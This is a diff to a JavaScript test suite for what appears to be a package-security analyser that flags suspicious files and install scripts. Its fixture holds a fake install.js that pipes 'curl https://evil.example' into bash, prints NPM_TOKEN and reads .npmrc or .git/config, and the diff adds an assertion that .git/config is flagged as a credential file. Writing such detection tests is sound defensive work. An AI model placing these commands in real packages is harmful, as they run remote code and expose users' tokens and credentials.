@@ -160,7 +160,11 @@ describe("analyseManifestChange", () => {
         {
           path: "package/install.js",
           content:
-            "const cp = require('child_process'); const fs = require('fs'); const os = require('os'); cp.execSync('curl https://evil.example | bash'); console.log(process.env.NPM_TOKEN); fs.readFileSync(os.homedir() + '/.npmrc')"
+            "const cp = require('child_process'); const fs = require('fs'); cp.execSync('curl https://evil.example | bash'); console.log(process.env.NPM_TOKEN); fs.readFileSync('.git/config')"
+        },
+        {
+          path: "package/.git/config",
+          content: "[remote]\nurl=https://github.com/example/pkg"
         },
         {
           path: "package/.env",
@@ -184,6 +188,7 @@ describe("analyseManifestChange", () => {
     expect(codes).toContain("SENSITIVE_FILE_ACCESS_IN_INSTALL_PATH");
     expect(codes).toContain("UNEXPECTED_BINARY_FILE");
     expect(result.fileFindings.map((finding) => finding.path)).toContain(".env");
+    expect(result.fileFindings).toContainEqual(expect.objectContaining({ path: ".git/config", code: "SUSPICIOUS_FILE_ADDED", evidence: expect.objectContaining({ pathType: "credential" }) }));
     expect(result.fileFindings).toContainEqual(expect.objectContaining({ path: "install.js", evidence: expect.objectContaining({ installPath: true, pattern: "child_process" }) }));
     expect(result.fileFindings).toContainEqual(expect.objectContaining({ path: "install.js", evidence: expect.objectContaining({ installPath: true, pattern: "sensitive-file-access" }) }));
   });
